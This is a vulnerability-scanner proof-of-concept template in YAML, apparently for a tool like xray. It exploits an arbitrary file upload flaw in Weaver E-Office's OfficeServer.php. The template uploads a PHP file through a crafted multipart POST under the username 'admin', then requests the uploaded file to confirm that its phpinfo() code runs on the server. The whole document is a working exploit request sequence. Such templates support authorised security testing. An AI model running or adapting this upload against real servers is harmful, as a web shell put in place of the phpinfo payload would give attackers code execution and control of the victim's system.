id: poc-yaml-weaver-e-office-OfficeServer-php-file-upload
info:
  name: 泛微OA E-Office OfficeServer.php 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: e-cology
variables:
  t1: random_int(1,1000)
requests:
- method: POST
  path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew
  data: '------WebKitFormBoundaryLpoiBFy4ANA8daew

    Content-Disposition: form-data;name="FileData";filename="{{.t1}}.php"

    Content-Type: application/octet-stream


    <?php

    phpinfo();

    ?>


    ------WebKitFormBoundaryLpoiBFy4ANA8daew

    Content-Disposition: form-data;name="FormData"


    {''USERNAME'':''admin'',''RECORDID'':''undefined'',''OPTION'':''SAVEFILE'',''FILENAME'':''{{.t1}}.php''}

    ------WebKitFormBoundaryLpoiBFy4ANA8daew--

    '
  expression: status_code == 200 && contains(body,"")
- method: GET
  path: /eoffice10/server/public/iWebOffice2015/Document/{{.t1}}.php
  expression: status_code == 200 && contains(body,"PHP Version") && contains(body,"PHP
    API") && contains(body,"Debug Build")
transport: http
